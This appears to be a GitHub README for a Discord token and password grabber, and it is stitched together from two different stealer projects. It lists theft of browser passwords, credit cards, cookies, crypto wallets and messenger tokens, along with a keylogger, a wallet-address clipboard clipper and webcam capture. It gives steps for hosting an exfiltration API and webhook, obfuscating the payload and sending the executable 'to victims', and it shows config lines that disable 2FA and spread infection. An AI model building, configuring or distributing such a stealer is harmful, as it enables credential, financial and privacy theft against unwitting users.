# Discord-Image-Token-Password-Grabber-Exploit-Cve-2022

AntiAnalysis (VirtualBox, SandBox, Debugger, VirusTotal, Any.Run)

![image](https://user-images.githubusercontent.com/106811566/171860372-4db82642-365a-4a78-a9ca-ea6171ab179d.png)


Get system info (Version, CPU, GPU, RAM, IPs, BSSID, Location, Screen metrics, Installed apps)

Chromium based browsers (passwords, credit cards, cookies, history, autofill, bookmarks)

Firefox based browsers (db files, cookies, history, bookmarks) Internet explorer/Edge (passwords)

Saved wifi networks & scan networks around device (SSID, BSSID) s File grabber (Documents, Images, Source codes, Databases, USB)

Detect banking & cryptocurrency services in browsers

Steam, Uplay, Battle.Net, Minecraft session

Install keylogger & clipper

Desktop & Webcam screenshot

![image](https://user-images.githubusercontent.com/106811566/171858268-4f009c5f-ba70-4f63-b02d-8962271020f5.png)


ProtonVPN, OpenVPN, NordVPN s Crypto Wallets

Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum, AtomicWallet, Guarda, Coinomi, Litecoin, Dash, Bitcoin

Crypto Wallet Extensions from Chrome & Edge Binance, coin98, Phantom, Mobox, XinPay, Math10, Metamask, BitApp, Guildwallet, iconx, Sollet, Slope Wallet, Starcoin, Swash, Finnie, KEPLR, Crocobit, OXYGEN, Nifty, Liquality, Auvitas wallet, Math wallet, MTV wallet, Rabet wallet, Ronin wallet, Yoroi wallet, ZilPay wallet, Exodus, Terra Station, Jaxx.

Messenger Sessions, Accounts, Tokens Discord, Telegram, ICQ, Skype, Pidgin, Outlook, Tox, Element, Signal

Directories structure Filezilla hosts Process list Product key Autorun module

🎹 Keylogger: The keylogger will turn on if the user is texting in the chat or using the bank's website.

📋 Clipper: Clipper turns on and replaces crypto wallet addresses in the clipboard when a user makes a transaction.

📷 Webcam screenshots: Webcam screenshots will be taken if the user is watching something obscene on the Internet.


# Features
 - No local caching
 - Transfers via Discord webhook
 - Searches for authorization tokens in multiple directories (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
 - No external Python modules required
 - \[**todo**\] Cross-platform support

<br>

# How to use
 1. Create a webhook on your Discord server. I recommend creating a new server.
 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
 3. *(obfuscate the code or install it as a backdoor in an other script.)*
 4. Send the script to your victim and make them run it.
# Features
* Steal Discord info
  * Username
  * E-mail
  * Phone Number
  * Nitro Type
  * ID
* Steal Discord token
  * Discord
  * Discord PTB
  * Discord Dev
* Steal Discord Password : When you change password & When you change e-mail & When you log-in in your discord account
  * Discord
  * Discord PTB
  * Discord Dev
  

# How to use

## #1 : API Hosting

### Method 1 : (require a vps)

Open port 80

Install Apache2 : 
```
$ sudo apt-get update
$ sudo apt-get install apache2
```

Test server : 

```
$ curl urserverurl
```

Configure Firewall :
```
$ sudo ufw allow 'Apache'
```

Verify the change :
```
$ sudo ufw status
```

Install API :
```
$ git clone https://github.com/Stanley-GF/api.git
```

Configure port & ip in the main index.js
```
$ cd api
$ nano index.js
```

Configure webhook url : 
```
$ cd api/endpoints
$ nano index.js
```

Your API URL gonna be : 
http://your-vps-ip/api/v1/send (replace your-vps-ip by ur real vps ip, obviously)

### Method 2 : Heroku (the best for beginner)

* Start https://heroku.com
* Signup an account
* Create an app
* Fork https://github.com/Stanley-GF/api on your github account
* Go in endpoints -> index.js -> edit and replace the webhook url by your webhook url
* Go in https://dashboard.heroku.com/apps/ , click on your app, go in "deploy" category
* In deployment method, select Github, login in your github account by authorize OAuth thing -> in App Connected, type "api" and select your project
* Enable "Automatic Deploy"
* press on Deploy Branch
* your server url gonna be : https://your-app-name.herokuapp.com/api/v1/send (replace your-app-name by ur real app name, obviously)

## #2 : Your .exe

* Download src of this project
* Open project
* Go in settings.cs and configure option : 

```cs

public static bool disableMfa = false; // disable 2FA 

public static bool restartDiscord = true; // restart discord after injection

public static bool spread = true; // ALWAYS TRUE : (for infect client)

private static string serverurl = "https://your-app-name.herokuapp.com/api/v1/send"; // replace "your-app-name.herokuapp.com/api/v1/send" by your api url

public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl; // don't tuch.
```

* Compile the project
* Go in `\HS-Grabber\HS-Grabber\bin\Debug`
* Send the .exe to victims ! 

# Some screenshot of the grabber

![yay](https://cdn.discordapp.com/attachments/797933407476777012/798145821203628052/unknown.png)
